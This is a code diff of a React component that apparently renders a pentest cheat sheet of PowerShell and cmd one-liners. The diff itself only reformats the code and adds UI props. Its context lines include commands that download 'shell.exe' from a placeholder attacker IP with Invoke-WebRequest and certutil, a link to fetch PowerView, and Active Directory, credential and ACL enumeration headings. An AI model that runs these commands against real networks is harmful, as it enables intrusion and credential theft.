@@ -22,12 +22,11 @@ export default function PowershellCommands() {
 	// windows wget like
 	const powershell_http_dl = 'Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe" ';
 	const cmd_cert_http_dl = 'certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe';
-	
-	
-	
-	// require powerview 
-	const power_view_repo:string = 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1';
-	
+
+	// require powerview
+	const power_view_repo: string =
+		'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1';
+
 	// domain enum
 	const domain_name = `Get-NetDomain`;
 	const forest_domain_list = `Get-NetForestDomain`;
@@ -73,40 +72,40 @@ export default function PowershellCommands() {
 				<Title level={3}>System enumeration</Title>
 				{local_sys_enum.map((k, i) => {
 					return (
-						<Paragraph key={i} copyable ellipsis={true}>
+						<Paragraph key={i} copyable code editable ellipsis={true}>
 							{k.title}
 						</Paragraph>
 					);
 				})}
 				<Text strong># List Security patches</Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{lastpatchlist}
 				</Paragraph>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{lastpatchlist_wmic}
 				</Paragraph>
 				<Text strong># Environment Variables</Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{envVar}
 				</Paragraph>
 				<Text strong> (over cmd.exe) </Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{envVar_cmd}
 				</Paragraph>
 				<Divider dashed />
 				<Title level={4}>HTTP download (wget like)</Title>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{powershell_http_dl}
 				</Paragraph>
 				<Text strong># Cmd compatible</Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{cmd_cert_http_dl}
 				</Paragraph>
 				<Divider dashed />
 				<Title level={4}>WLAN enumeration</Title>
 				{wlan_creddump.map((k, i) => {
 					return (
-						<Paragraph key={i} copyable ellipsis={true}>
+						<Paragraph key={i} copyable code editable ellipsis={true}>
 							{k.title}
 						</Paragraph>
 					);
@@ -122,37 +121,37 @@ export default function PowershellCommands() {
 			>
 				<Title level={2}>Active Directory enumeration</Title>
 				<Paragraph>Require Powerview.ps1</Paragraph>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{power_view_repo}
 				</Paragraph>
 				<Title level={4}>Domain enumeration</Title>
 
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{domain_name}
 				</Paragraph>
 
 				<Text strong># List Forest Domains </Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{forest_domain_list}
 				</Paragraph>
 
 				<Text strong># Domain SID </Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{domain_SID}
 				</Paragraph>
 
 				<Text strong># Domain Policy </Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{domain_Policy}
 				</Paragraph>
 
 				<Text strong># Domain Organizational Units </Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{domain_OUs}
 				</Paragraph>
 
 				<Text strong># List trusted Domains</Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{domain_trust}
 				</Paragraph>
 
@@ -161,7 +160,7 @@ export default function PowershellCommands() {
 				<Title level={4}> GPO enumeration</Title>
 
 				<Text strong># GPO applied to the machine</Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{gpo_enum}
 				</Paragraph>
 
@@ -170,11 +169,11 @@ export default function PowershellCommands() {
 				<Title level={4}> Password enumeration</Title>
 
 				<Text strong># Last Password Set date</Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{passwd_lastset}
 				</Paragraph>
 				<Text strong># Description of User object </Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{user_desc_harvest}
 				</Paragraph>
 				<Divider dashed />
@@ -182,15 +181,15 @@ export default function PowershellCommands() {
 				<Title level={4}> Computer enumeration</Title>
 
 				<Text strong># List Computers of the Domain</Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{domain_computers}
 				</Paragraph>
 				<Text strong># List Pingable Hosts </Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{domain_pingable_computers}
 				</Paragraph>
 				<Text strong># List Windows 7 Ultimate Computers </Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{domain_win7U_computers}
 				</Paragraph>
 
@@ -199,20 +198,20 @@ export default function PowershellCommands() {
 				<Title level={4}> Admin groups and account enumeration</Title>
 
 				<Text strong># List Domain Admin members</Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{domain_admin_members}
 				</Paragraph>
 				<Text strong># List Admin Groups </Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{domain_admins_groups}
 				</Paragraph>
 				<Text strong># List Local Admins [need Administrative rights] </Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{local_admins}
 				</Paragraph>
 
 				<Text strong># Get groups of user [need Administrative rights] </Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{user_group_membership}
 				</Paragraph>
 
@@ -221,17 +220,17 @@ export default function PowershellCommands() {
 				<Title level={4}> ACL enumeration</Title>
 
 				<Text strong># User ACL </Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{ACL_user_enum}
 				</Paragraph>
 
 				<Text strong># GPO modifications rights</Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{ACL_gpoedit_rights}
 				</Paragraph>
 
 				<Text strong># Password reset rights</Text>
-				<Paragraph copyable ellipsis={true}>
+				<Paragraph copyable code editable ellipsis={true}>
 					{ACL_passwd_edit_rights}
 				</Paragraph>
 			</div>
